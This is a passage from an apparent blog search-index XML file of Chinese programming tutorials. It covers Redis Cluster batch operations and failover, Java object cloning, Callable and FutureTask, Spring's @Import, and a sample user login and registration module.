catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void destory()&#123; if(jedisCluster != null)&#123; try &#123; jedisCluster.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public JedisCluster getJedisCluster() &#123; return jedisCluster; &#125; //spring注入hostPortList和timeout public void setHostPortList(List&lt;String&gt; hostPortList) &#123; this.hostPortList = hostPortList; &#125; public void setTimeout(int timeout) &#123; this.timeout = timeout; &#125;&#125; hostPortList 放入spring bean中，spring自动完成注入。 6.3 多节点命令实现有的时候我们想操作所有节点的数据。如何实现呢？ 6.4 批量操作mget,mset必须在一个槽。这个条件比较苛刻，一般是不能保证的，那么如何实现批量的操作呢？ Redis Cluster的行为和Redis 的单节点不同，甚至和一个Sentinel 监控的主从模式也不一样。主要原因是集群自动分片，将一个key 映射到16384个槽中的一个，这些槽分布在多个节点上。因此操作多个key 的命令必须保证所有的key 都映射到同一个槽上，避免跨槽执行错误。更进一步说，今后一个单独的集群节点，只服务于一组专用的keys，请求一个命令到一个Server，只能得到该Server 上拥有keys 的对应结果。一个非常简单的例子是执行KEYS命令，当发布该命令到集群环境中的某个节点是时，只能得到该节点上拥有的keys，而不是集群中所有的keys。所以要得到集群中所有的keys，必须从集群的所有主节点上获取所有的keys。 对于分散在redis集群中不同节点的数据，我们如何比较高效地批量获取数据呢？？？？ 串行mget–原始方案，整一个for循环 串行IO 对key进行RCR16和取余操作得到slot，将slots按照节点进行分批传送： 并行IO hash_tag 不做任何改变的话，hash之后就比较均匀地散在每个节点上： 那么我们能不能像使用单机redis一样，一次IO将所有的key取出来呢？hash-tag提供了这样的功能，如果将上述的key改为如下，也就是用大括号括起来相同的内容，那么这些key就会到指定的一个节点上。 在mget的时候只需要在一台机器上去即可。 对比 方案三比较复杂，一般不用；方案四可能会出现数据倾斜，也不用。方案一在key小的时候可以用；方案二相对来说有一点优势； 为什么说是一点优势呢？pipeline批量处理不应该比串行处理好很多吗？ http://xiezefan.me/2015/12/13/redis_cluster_research_2/ http://trumandu.github.io/2016/05/09/RedisCluster%E6%9E%84%E5%BB%BA%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C%E6%8E%A2%E8%AE%A8/ 7. 故障转移7.1 故障发现 通过ping/pong消息实现故障发现：不需要sentinel 分为主观下线和客观下线 主观下线： 客观下线： pfail消息就是主观下线的信息，，维护在一个链表中，链表中包含了所有其他节点对其他节点所有的主观信息，是有时间周期的，为了防止很早以前的主观下线信息还残留在这里。对这个链表进行分析，符合条件就尝试客观下线。 7.2 故障恢复从节点接收到他的主节点客观下线的通知，则进行故障恢复的操作。 资格检查 选取出符合条件的从节点：当从节点和故障主节点的断线时间太长，会被取消资格。 准备选举时间 就是为了保证偏移量大的从节点优先被选举投票 选举投票 替换主节点 这些所有步骤加起来，差不多十几秒左右。最后如果故障节点又恢复功能了，就称为新的Master的slave节点。 8. 常见问题8.1 集群完整性cluster-require-full-coverage默认为yes - 要求所有节点都在服务，集群中16384个槽全部可用：保证集群完整性 - 节点故障或者正在故障转移：`(error)CLUSTERDOWN the cluster is down` 但是大多数业务都无法容忍。需要将cluster-require-full-coverage设置为no 8.2 带宽消耗 消息发送频率：节点发现与其他节点最后通信时间超过cluster-node-timeout/2时会直接发送Ping消息 消息数据量：slots槽数组(2k空间)和整个集群1、10的状态数据(10个节点状态数据约10k) 节点部署的机器规模：进去分布的机器越多且每台机器划分的节点数越均匀，则集群内整体的可用带宽越高。 优化：避免“大”集群，：避免多业务使用一个集群，大业务可用多集群；cluster-node-timeout时间设置要注意是带宽和故障转移速度的均衡；尽量均匀分配到多机器上：保证高可用和带宽。 8.3 PubSub广播 问题：publish在集群中每个节点广播：加重带宽。 解决：单独“走”一套redis sentinel。 8.4 数据倾斜 节点和槽分配不均匀 ./redis-trib.rb info ip:port查看节点、槽、键值分布 慎用rebalance命令 不同槽位对应键数量差异较大 CRC16正常情况下比较均匀 可能存在hash_tag cluster countKeysinslot {slot}获取槽对应键值个数 包含bigkey 例如大字符串、几百万的元素的hash、set等 在从节点上执行:redis-cli --bigkeys来查看bigkey情况 优化：优化数据结构 内存相关配置不一致 因为某种情况下，某个节点对hash或者Set这种数据结构进行了单独的优化，而其他节点都没有配置，会出现配置不一致的情况。 8.5 请求倾斜 热点key：重要的key或者bigkey 优化：避免bigkey;热键不使用hash_tag；当一致性不高时，可以用本地缓存+MQ 8.6 读写分离 只读连接：集群模式的从节点不接受任何读写请求 重定向到负责槽的主节点(对从节点进行读，都是重定向到主节点再返回信息) readonly命令可以读：连接级别命令(每次重新连接都要写一次) 上图可以看出，redis cluster 默认slave 也是不能读的，如果要读取，需要执行 readonly，就可以了。 读写分离：更加复杂（成本很高，尽量不要使用） 同样的问题：复制延迟、读取过期数据、从节点故障 修改客户端 8.7 数据迁移分为离线迁移和在线迁移(唯品会redis-migrate-tool和豌豆荚redis-port)。 官方的方式：只能从单机迁移到集群、不支持在线迁移、不支持断点续传、单线程迁移影响速度 ./redis-trib.rb import --from 源ip:port --copy 目标ip:port 加入在迁移时再往源redis插入几条数据，这几条数据会丢失(丢失一部分) 8.8 集群vs单机集群也有一定的限制： 分布式redis不一定是好的： 9. 简单总结]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.java克隆]]></title>
    <url>%2F2018%2F07%2F21%2F7.java%E5%85%8B%E9%9A%86%2F</url>
    <content type="text"><![CDATA[本篇文章探讨Java克隆方面的知识。 1. Java中对象的创建clone顾名思义就是复制， 在Java语言中， clone方法被对象调用，所以会复制对象。所谓的复制对象，首先要分配一个和源对象同样大小的空间，在这个空间中创建一个新的对象。那么在java语言中，有几种方式可以创建对象呢？ 使用new操作符创建一个对象 使用clone方法复制一个对象 那么这两种方式有什么相同和不同呢？ new操作符的本意是分配内存。程序执行到new操作符时， 首先去看new操作符后面的类型，因为知道了类型，才能知道要分配多大的内存空间。分配完内存之后，再调用构造函数，填充对象的各个域，这一步叫做对象的初始化，构造方法返回后，一个对象创建完毕，可以把他的引用（地址）发布到外部，在外部就可以使用这个引用操纵这个对象。而clone在第一步是和new相似的， 都是分配内存，调用clone方法时，分配的内存和源对象（即调用clone方法的对象）相同，然后再使用原对象中对应的各个域，填充新对象的域， 填充完成之后，clone方法返回，一个新的相同的对象被创建，同样可以把这个新对象的引用发布到外部。 2. 复制对象 or 复制引用在Java中，以下类似的代码非常常见： 12345Person p = new Person(23, "zhang"); Person p1 = p; System.out.println(p); System.out.println(p1); 当Person p1 = p;执行之后， 是创建了一个新的对象吗？ 首先看打印结果： 12com.pansoft.zhangjg.testclone.Person@2f9ee1accom.pansoft.zhangjg.testclone.Person@2f9ee1ac 可已看出，打印的地址值是相同的，既然地址都是相同的，那么肯定是同一个对象。p和p1只是引用而已，他们都指向了一个相同的对象Person(23, &quot;zhang&quot;) 。 可以把这种现象叫做引用的复制。 而下面的代码是真真正正的克隆了一个对象。 12345Person p = new Person(23, "zhang"); Person p1 = (Person) p.clone(); System.out.println(p); System.out.println(p1); 从打印结果可以看出，两个对象的地址是不同的，也就是说创建了新的对象， 而不是把原对象的地址赋给了一个新的引用变量： 12com.pansoft.zhangjg.testclone.Person@2f9ee1accom.pansoft.zhangjg.testclone.Person@67f1fba0 以上代码执行完成后， 内存中的情景如下图所示： 3. 深拷贝 or 浅拷贝12345678910111213141516171819202122232425public class Person implements Cloneable&#123; private int age ; private String name; public Person(int age, String name) &#123; this.age = age; this.name = name; &#125; public Person() &#123;&#125; public int getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; @Override protected Object clone() throws CloneNotSupportedException &#123; return (Person)super.clone(); &#125; &#125; age是基本数据类型，那么对它的拷贝没有什么疑议，直接将一个4字节的整数值拷贝过来就行。 name是String类型的， 它只是一个引用， 指向一个真正的String对象，那么对它的拷贝有两种方式： 直接将源对象中的name的引用值拷贝给新对象的name字段 或者是根据原Person对象中的name指向的字符串对象创建一个新的相同的字符串对象，将这个新字符串对象的引用赋给新拷贝的Person对象的name字段。 这两种拷贝方式分别叫做浅拷贝和深拷贝。深拷贝和浅拷贝的原理如下图所示： 下面通过代码进行验证。如果两个Person对象的name的地址值相同， 说明两个对象的name都指向同一个String对象， 也就是浅拷贝， 而如果两个对象的name的地址值不同， 那么就说明指向不同的String对象， 也就是在拷贝Person对象的时候， 同时拷贝了name引用的String对象， 也就是深拷贝。验证代码如下： 1234567Person p = new Person(23, "zhang"); Person p1 = (Person) p.clone(); String result = p.getName() == p1.getName() ? "clone是浅拷贝的" : "clone是深拷贝的"; System.out.println(result); //clone是浅拷贝的 覆盖Object中的clone方法， 实现深拷贝: 1234567891011121314151617181920212223242526272829public class Test&#123; static class Body implements Cloneable&#123; public Head head; public Body() &#123;&#125; public Body(Head head) &#123;this.head = head;&#125; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125; &#125; static class Head&#123; &#125; public static void main(String[] args) throws CloneNotSupportedException &#123; Body body = new Body(new Head()); Body body1 = (Body) body.clone(); System.out.println("body == body1 : " + (body == body1) ); System.out.println("body.head == body1.head : " + (body.head == body1.head)); &#125; &#125; Body中组合了Head，重写了Body的clone方法，那么显然第一个输出为false；但是没有对Head进行重写clone方法，那么他们指向的是同一个内存空间。即，没有重写clone的Head类只是浅拷贝。 12body == body1 : falsebody.head == body1.head : true 如果要使Body对象在clone时进行深拷贝， 那么就要在Body的clone方法中，将源对象引用的Head对象也clone一份。1234567891011121314151617181920212223242526272829303132333435public class Test&#123; static class Body implements Cloneable&#123; public Head head; public Body() &#123;&#125; public Body(Head head) &#123;this.head = head;&#125; @Override protected Object clone() throws CloneNotSupportedException &#123; Body newBody = (Body)super.clone(); newBody.head = (Head)head.clone(); return newBody; &#125; &#125; static class Head implements Cloneable&#123; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125; &#125; public static void main(String[] args) throws CloneNotSupportedException &#123; Body body = new Body(new Head()); Body body1 = (Body) body.clone(); System.out.println("body == body1 : " + (body == body1) ); System.out.println("body.head == body1.head : " + (body.head == body1.head)); &#125; &#125; 打印结果： 12body == body1 : falsebody.head == body1.head : false 由此，我们得到一个结论：如果想要深拷贝一个对象， 这个对象必须要实现Cloneable接口，实现clone方法，并且在clone方法内部，把该对象引用的其他对象也要clone一份 ， 这就要求这个被引用的对象必须也要实现Cloneable接口并且实现clone方法。 那么，按照上面的结论， Body类组合了Head类， 而Head类组合了Face类，要想深拷贝Body类，必须在Body类的clone方法中将Head类也要拷贝一份，但是在拷贝Head类时，默认执行的是浅拷贝，也就是说Head中组合的Face对象并不会被拷贝。验证代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Test&#123; static class Body implements Cloneable&#123; public Head head; public Body() &#123;&#125; public Body(Head head) &#123;this.head = head;&#125; @Override protected Object clone() throws CloneNotSupportedException &#123; Body newBody = (Body) super.clone(); newBody.head = (Head) head.clone(); return newBody; &#125; &#125; static class Head implements Cloneable&#123; public Face face; public Head() &#123;&#125; public Head(Face face)&#123;this.face = face;&#125; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125; &#125; static class Face&#123;&#125; public static void main(String[] args) throws CloneNotSupportedException &#123; Body body = new Body(new Head(new Face())); Body body1 = (Body) body.clone(); System.out.println("body == body1 : " + (body == body1) ); System.out.println("body.head == body1.head : " + (body.head == body1.head)); System.out.println("body.head.face == body1.head.face : " + (body.head.face == body1.head.face)); &#125; &#125; 输出结果符合预期： 123body == body1 : falsebody.head == body1.head : falsebody.head.face == body1.head.face : true 内存结构图如下图所示： 那么此时Head中组合的Face又是一个浅拷贝。那么到底如何实现彻底的深拷贝呢？ 对于上面的例子来说，怎样才能保证两个Body对象完全独立呢？只要在拷贝Head对象的时候，也将Face对象拷贝一份就可以了。这需要让Face类也实现Cloneable接口，实现clone方法，并且在在Head对象的clone方法中，拷贝它所引用的Face对象。修改的部分代码如下： 1234567891011121314151617181920static class Head implements Cloneable&#123; public Face face; public Head() &#123;&#125; public Head(Face face)&#123;this.face = face;&#125; @Override protected Object clone() throws CloneNotSupportedException &#123; //return super.clone(); Head newHead = (Head) super.clone(); newHead.face = (Face) this.face.clone(); return newHead; &#125; &#125; static class Face implements Cloneable&#123; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125; &#125; 再次运行上面的示例，得到的运行结果如下： 123body == body1 : falsebody.head == body1.head : falsebody.head.face == body1.head.face : false 这说名两个Body已经完全独立了，他们间接引用的face对象已经被拷贝，也就是引用了独立的Face对象。内存结构图如下： 显然，对于复杂的对象而言，用这种方式实现深拷贝是十分困难的。这时我们可以用序列化的方式来实现对象的深克隆。 4. 序列化解决多层克隆问题首先由一个外部类Outer： 12345678910111213141516171819202122232425262728293031323334353637383940public class Outer implements Serializable&#123; private String outName; private Inner inner; public Inner getInner() &#123; return inner; &#125; public Outer(String outName, Inner inner) &#123; super(); this.outName = outName; this.inner = inner; &#125; public Outer()&#123;&#125; //[深度复制方法,需要对象及对象所有的对象属性都实现序列化] public Outer myclone(Outer outer) &#123; try &#123; // 将该对象序列化成流,因为写在流里的是对象的一个拷贝，而原对象仍然存在于JVM里面。所以利用这个特性可以实现对象的深拷贝 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(this); // 将流序列化成对象 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); outer = (Outer) ois.readObject(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return outer; &#125; @Override public String toString() &#123; return "outer的name值为：" + outName; &#125; &#125; 再来一个被引用的类Inner: 12345678910111213public class Inner implements Serializable&#123; private String innerName; public Inner(String innerName) &#123; this.innerName = innerName; &#125; @Override public String toString() &#123; return "Inner的name值为：" + innerName; &#125;&#125; 再对克隆的对象进行测试： 123456789101112131415public class Test&#123; public static void main(String[] args) throws CloneNotSupportedException &#123; Inner inner = new Inner("inner"); Outer outer = new Outer("outer",inner); Outer testOuter = outer.myclone(outer); System.out.println(testOuter == outer); System.out.println(testOuter.getInner() == inner); System.out.println(testOuter); System.out.println(testOuter.getInner()); &#125; &#125; 运行结果： 1234falsefalseouter的name值为：outerInner的name值为：inner 参考： https://www.cnblogs.com/Qian123/p/5710533.html https://blog.csdn.net/zhangjg_blog/article/details/18369201]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.JUC组件拓展-Callable、Future和FutureTask]]></title>
    <url>%2F2018%2F07%2F21%2F7.JUC%E7%BB%84%E4%BB%B6%E6%8B%93%E5%B1%95-Callable%E3%80%81Future%E5%92%8CFutureTask%2F</url>
    <content type="text"><![CDATA[JUC组件拓展-Callable、Future和FutureTask. Callable、Future和FutureTask创建线程有2种方式，一种是直接继承Thread，另外一种就是实现Runnable接口。这2种方式都有一个缺陷就是：在执行完任务之后无法获取执行结果。如果需要获取执行结果，就必须通过共享变量或者使用线程通信的方式来达到效果，这样使用起来就比较麻烦。 而自从Java 1.5开始，就提供了Callable和Future，通过它们可以在任务执行完毕之后得到任务执行结果。 callable和runnableRunnable是一个接口，在它里面只声明了一个run()方法：123public interface Runnable &#123; public abstract void run();&#125; 由于run()方法返回值为void类型，所以在执行完任务之后无法返回任何结果。 Callable位于java.util.concurrent包下，它也是一个接口，在它里面也只声明了一个方法，只不过这个方法叫做call()： 12345678910//call()函数返回的类型就是传递进来的V类型public interface Callable&lt;V&gt; &#123; /** * Computes a result, or throws an exception if unable to do so. * * @return computed result * @throws Exception if unable to compute a result */ V call() throws Exception;&#125; 那么怎么使用Callable呢？一般情况下是配合ExecutorService来使用的，在ExecutorService接口中声明了若干个submit方法的重载版本： 123&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task);&lt;T&gt; Future&lt;T&gt; submit(Runnable task, T result);Future&lt;?&gt; submit(Runnable task); 注意，这里线程的submit()和execute()的区别： 例如，创建可缓存线程池，Executors.newCachedThreadPool()，源码如下： 12345public static ExecutorService newCachedThreadPool() &#123; return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());&#125; 该方法返回的是一个ExecutorService接口，而这个接口继承Executor接口，Executor是最上层的，其中只包含一个execute()方法： 123public interface Executor &#123; void execute(Runnable command);&#125; execute()方法的入参为一个Runnable，返回值为void。 而submit已经在上面说了，是ExecutorService接口中的方法，是由返回值的。 所以他们的区别是： 接收的参数不一样; submit()有返回值，而execute()没有; submit()可以进行Exception处理; 两者功能大致相似，callable更强大一些，因为对线程执行后可以有返回值，并且可以抛出异常。 关于runnable创建线程就不再赘述了，callable与future结合起来一起使用，在下面将给出例子。 Future接口对于callable或者runnable的任务，可以进行取消，查询任务是否被取消，查询任务是否完成以及获取结果。future可以得到别的线程任务方法的返回值。 必要时可以通过get方法获取执行结果，该方法会阻塞直到任务返回结果。 Future类位于java.util.concurrent包下，它是一个接口： 12345678public interface Future&lt;V&gt; &#123; boolean cancel(boolean mayInterruptIfRunning); boolean isCancelled(); boolean isDone(); V get() throws InterruptedException, ExecutionException; V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;&#125; 在Future接口中声明了5个方法，下面依次解释每个方法的作用： cancel方法用来取消任务，如果取消任务成功则返回true，如果取消任务失败则返回false。参数mayInterruptIfRunning表示是否允许取消正在执行却没有执行完毕的任务，如果设置true，则表示可以取消正在执行过程中的任务。 如果任务已经完成，则无论mayInterruptIfRunning为true还是false，此方法肯定返回false，即如果取消已经完成的任务会返回false； 如果任务正在执行，若mayInterruptIfRunning设置为true，则返回true，若mayInterruptIfRunning设置为false，则返回false；-如果任务还没有执行，则无论mayInterruptIfRunning为true还是false，肯定返回true。 isCancelled方法表示任务是否被取消成功，如果在任务正常完成前被取消成功，则返回 true。 isDone方法表示任务是否已经完成，若任务完成，则返回true； get()方法用来获取执行结果，这个方法会产生阻塞，会一直等到任务执行完毕才返回； get(long timeout, TimeUnit unit)用来获取执行结果，如果在指定时间内，还没获取到结果，就直接返回null。 也就是说Future提供了三种功能：判断任务是否完成；能够中断任务；能够获取任务执行结果。 因为Future只是一个接口，所以是无法直接用来创建对象使用的，因此就有了下面的FutureTask。 12345678910111213141516171819202122@Slf4jpublic class FutureTest &#123; static class MyCallable implements Callable&lt;String&gt;&#123; @Override public String call() throws Exception &#123; log.info("do something in callable..."); Thread.sleep(5000); return "Done"; &#125; &#125; public static void main(String[] args) throws InterruptedException, ExecutionException &#123; ExecutorService exec = Executors.newCachedThreadPool(); //获取callable运行结果 Future&lt;String&gt; future = exec.submit(new MyCallable()); log.info("do something in main..."); Thread.sleep(1000); String result = future.get(); log.info("result=&#123;&#125;...",result); exec.shutdown(); &#125;&#125; 运行结果： 123421:21:20.441 [main] INFO - do something in main...21:21:20.462 [pool-1-thread-1] INFO - do something in callable...//等5秒后才拿到结果21:21:25.462 [main] INFO - result=Done... FutureTask类我们先来看一下FutureTask的实现： 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; FutureTask类实现了RunnableFuture接口，我们看一下RunnableFuture接口的实现： 123public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; &#123; void run();&#125; 可以看出RunnableFuture继承了Runnable接口和Future接口，而FutureTask实现了RunnableFuture接口。所以它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值。 事实上，FutureTask是Future接口的一个唯一实现类。 FutureTask提供了2个构造器： 1234public FutureTask(Callable&lt;V&gt; callable) &#123;&#125;public FutureTask(Runnable runnable, V result) &#123;&#125; 那么，我们就可以在FutureTask传入一个callable任务了： 12345678910111213141516171819@Slf4jpublic class FutureTaskTest &#123; public static void main(String[] args) throws Exception &#123; FutureTask&lt;String&gt; futureTask = new FutureTask&lt;String&gt;(new Callable&lt;String&gt;() &#123; @Override public String call() throws Exception &#123; log.info("do something in callable..."); Thread.sleep(5000); return "Done"; &#125; &#125;); new Thread(futureTask).start(); log.info("do something in main..."); Thread.sleep(1000); String result = futureTask.get(); log.info("result=&#123;&#125;...",result); &#125;&#125; 运行效果同上。都可以实现一个场景：一个复杂的任务执行，但是不是立即需要他的结果，而是我这个线程继续干其他事情，等需要他 结果的时候，再去跟她要。我可以拿到他的返回值继续做其他事情。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.@Import]]></title>
    <url>%2F2018%2F07%2F21%2F7.%40Import%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 @Import-给容器中快速导入一个组件上面所说得给容器注册组件的方式是： 包扫描+组件标注注解：@Controller，@Service，@Repository，@Component 比较方便，但是有局限性：如果是注册第三方包怎么办呢？ 有一种是：@Bean[导入第三方包里面的组件],对于简单的可用这样用 还有一种是：@Import，快速给容器导入一个组件 比如我随便新建一个类叫Dog，里面啥注解和内容都不写。默认他是不会导入进去的。但是我在webconfig类上增加注解： @Import(Dog.class) 那么再次打印出所有注册进容器的组件时，会出现 com.swg.bean.Dog 可见，@import注解可以方便快速地导入一个组件，并且id默认是组件的全类名 那如何导入多个呢？ @Import({Dog.class, Cat.class}) @Import-使用ImportSelector123456789101112131415/** * 自定义逻辑返回需要导入的组件 */public class MyImportSelector implements ImportSelector&#123; /** * * @param annotationMetadata 当前标注Import注解的类的所有注解信息 * @return 返回值就是导入到容器中的组件的全类名 */ @Override public String[] selectImports(AnnotationMetadata annotationMetadata) &#123; return new String[]&#123;"com.swg.bean.Dog","com.swg.bean.Cat","com.swg.bean.pig"&#125;; &#125;&#125; 然后打上注解导入进来即可： @Import(MyImportSelector.class) 这里导入的实际上不是MyImportSelector.class这个类，而是他返回的组件全类名 @Import-使用ImportBeanDefinitionRegistrar1234567891011121314151617181920212223public class MyImportBeanDefinitionRegistrar implements ImportBeanDefinitionRegistrar &#123; /** * * @param annotationMetadata 当前类的注解信息 * @param registry beanDefinition注册类； * 把所有需要添加进容器的bean：调用BeanDefinitionRegistry.registerBeanDefinition * 来手工注册进来 * */ @Override public void registerBeanDefinitions(AnnotationMetadata annotationMetadata, BeanDefinitionRegistry registry) &#123; //判断这两个bean是否都已经存在于容器中 boolean definition = registry.containsBeanDefinition("com.swg.bean.Pig"); boolean definition2 = registry.containsBeanDefinition("com.swg.bean.Cat"); //如果两个bean都有，则注册一头牛 if(definition &amp;&amp; definition2)&#123; //指定bean定义信息 RootBeanDefinition rootBeanDefinition = new RootBeanDefinition(Bull.class); //注册一个bean，指定bean的名字 registry.registerBeanDefinition("bull",rootBeanDefinition); &#125; &#125;&#125; 然后打上注解导入进来即可： @Import(MyImportBeanDefinitionRegistrar.class) 这样可以实现手工的注册bean]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6、用户管理模块]]></title>
    <url>%2F2018%2F07%2F21%2F6%E3%80%81%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[用户模块 1、门户用户登陆 /user/login.dorequest1username,password fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;密码错误&quot;&#125; success123456789101112&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 12, &quot;username&quot;: &quot;aaa&quot;, &quot;email&quot;: &quot;aaa@163.com&quot;, &quot;phone&quot;: null, &quot;role&quot;: 0, &quot;createTime&quot;: 1479048325000, &quot;updateTime&quot;: 1479048325000 &#125;&#125; 这个api在登陆错误时只返回status和msg，不返回data。在登陆成功时，返回status和data。 首先对于这个统一的相应进行一个封装ServerReponse. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273@Getter @JsonSerialize(include = JsonSerialize.Inclusion.NON_NULL)//json序列化时，null的对象,key会消失public class ServerResponse&lt;T&gt; implements Serializable&#123; private static final long serialVersionUID = -6819559706322722855L; private int status;//状态码 private String msg;//提示信息 private T data;//数据 //几个私有的构造方法 private ServerResponse(int status)&#123; this.status = status; &#125; private ServerResponse(int status,T data)&#123; this.status = status; this.data = data; &#125; private ServerResponse(int status,String msg,T data)&#123; this.status = status; this.msg = msg; this.data = data; &#125; private ServerResponse(int status,String msg)&#123; this.status = status; this.msg = msg; &#125; //判断是否成功 @JsonIgnore public boolean isSuccess()&#123; return this.status == ResponseEnum.SUCCESS.getCode(); &#125; /** * 返回成功的几个方法 * @param &lt;T&gt; * @return */ public static &lt;T&gt;ServerResponse&lt;T&gt; createBySuccess()&#123; return new ServerResponse&lt;&gt;(ResponseEnum.SUCCESS.getCode()); &#125; public static &lt;T&gt;ServerResponse&lt;T&gt; createBySuccessMessage(String msg)&#123; return new ServerResponse&lt;&gt;(ResponseEnum.SUCCESS.getCode(),msg); &#125; public static &lt;T&gt;ServerResponse&lt;T&gt; createBySuccess(T data)&#123; return new ServerResponse&lt;&gt;(ResponseEnum.SUCCESS.getCode(),data); &#125; public static &lt;T&gt;ServerResponse&lt;T&gt; createBySuccess(String msg,T data)&#123; return new ServerResponse&lt;&gt;(ResponseEnum.SUCCESS.getCode(),msg,data); &#125; /** * 返回失败的几个方法 * @param &lt;T&gt; * @return */ public static &lt;T&gt;ServerResponse&lt;T&gt; createByError()&#123; return new ServerResponse&lt;&gt;(ResponseEnum.ERROR.getCode(),ResponseEnum.ERROR.getDesc()); &#125; public static &lt;T&gt;ServerResponse&lt;T&gt; createByErrorMessage(String msg)&#123; return new ServerResponse&lt;&gt;(ResponseEnum.ERROR.getCode(),msg); &#125; public static &lt;T&gt;ServerResponse&lt;T&gt; createByErrorCodeMessage(int code,String msg)&#123; return new ServerResponse&lt;&gt;(code,msg); &#125;&#125; 对于其中几个状态，用一个枚举的类来表示： 12345678910111213141516171819@Getterpublic enum ResponseEnum &#123; //成功 SUCCESS(0,"SUCCESS"), //失败 ERROR(1,"ERROR"), //需要登陆 NEED_LOGIN(10,"NEED_LOGIN"), //参数错误 ILLEGAL_ARGUMENT(2,"ILLEGAL_ARGUMENT"); private final int code; private final String desc; ResponseEnum(int code,String desc)&#123; this.code = code; this.desc = desc; &#125;&#125; 下面就是登陆的controller方法： 12345678910@RequestMapping(value = "login.do",method = RequestMethod.POST)@ResponseBodypublic ServerResponse&lt;User&gt; login(String username, String password, HttpSession session)&#123; ServerResponse&lt;User&gt; response = userService.login(username,password); if(response.isSuccess())&#123; //登陆成功，就将其放入session中 session.setAttribute(Constants.CURRENT_USER,response.getData()); &#125; return response;&#125; 其中service层是： 1234567891011121314151617@Overridepublic ServerResponse&lt;User&gt; login(String username, String password) &#123; /**用户校验 SELECT count(1) from mmall_user where username = #&#123;username&#125;*/ int resultCount = userMapper.checkUsername(username); if(resultCount == 0)&#123; return ServerResponse.createByErrorMessage("用户名不存在"); &#125; //密码登陆md5 String md5Password = MD5Util.MD5EncodeUtf8(password); /**登陆 SELECT &lt;include refid="Base_Column_List"/&gt; from mmall_user WHERE username = #&#123;username&#125; and password = #&#123;password&#125; */ User user = userMapper.selectLogin(username,md5Password); if(user == null)&#123; return ServerResponse.createByErrorMessage("密码错误"); &#125; user.setPassword(StringUtils.EMPTY); return ServerResponse.createBySuccess("登陆成功",user);&#125; 其中,MD5加密工具类是： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class MD5Util &#123; private static String byteArrayToHexString(byte b[]) &#123; StringBuffer resultSb = new StringBuffer(); for (int i = 0; i &lt; b.length; i++) resultSb.append(byteToHexString(b[i])); return resultSb.toString(); &#125; private static String byteToHexString(byte b) &#123; int n = b; if (n &lt; 0) n += 256; int d1 = n / 16; int d2 = n % 16; return hexDigits[d1] + hexDigits[d2]; &#125; /** * 返回大写MD5 * * @param origin * @param charsetname * @return */ private static String MD5Encode(String origin, String charsetname) &#123; String resultString = null; try &#123; resultString = new String(origin); MessageDigest md = MessageDigest.getInstance("MD5"); if (charsetname == null || "".equals(charsetname)) resultString = byteArrayToHexString(md.digest(resultString.getBytes())); else resultString = byteArrayToHexString(md.digest(resultString.getBytes(charsetname))); &#125; catch (Exception exception) &#123; &#125; return resultString.toUpperCase(); &#125; public static String MD5EncodeUtf8(String origin) &#123; origin = origin + PropertiesUtil.getProperty("password.salt", ""); return MD5Encode(origin, "utf-8"); &#125; private static final String hexDigits[] = &#123;"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"&#125;;&#125; 2、门户用户注册/user/regiser.dorequest1username,password,email,phone,question,answer fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;用户已存在&quot;&#125; success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;校验成功&quot;&#125; 注册的controller： 12345@RequestMapping(value = "register.do",method = RequestMethod.GET)@ResponseBodypublic ServerResponse&lt;String&gt; register(User user)&#123; return userService.register(user);&#125; 对应的service： 12345678910111213141516171819202122232425262728293031public ServerResponse&lt;String&gt; register(User user)&#123;//用户校验老方法：//int resultCount = userMapper.checkUsername(user.getUsername());// if(resultCount &gt; 0)&#123;// return ServerResponse.createByErrorMessage("用户名已存在");// &#125; ServerResponse validResponse = this.checkValid(user.getUsername(),Constants.USERNAME); //如果返回成功，说明用户名不存在 if(!validResponse.isSuccess())&#123; return validResponse; &#125;//邮箱校验老方法：//resultCount = userMapper.checkEmail(user.getEmail());// if(resultCount &gt; 0)&#123;// return ServerResponse.createByErrorMessage("邮箱已存在");// &#125; validResponse = this.checkValid(user.getEmail(),Constants.EMAIL); //如果返回成功，说明邮箱不存在 if(!validResponse.isSuccess())&#123; return validResponse; &#125; //默认是普通用户 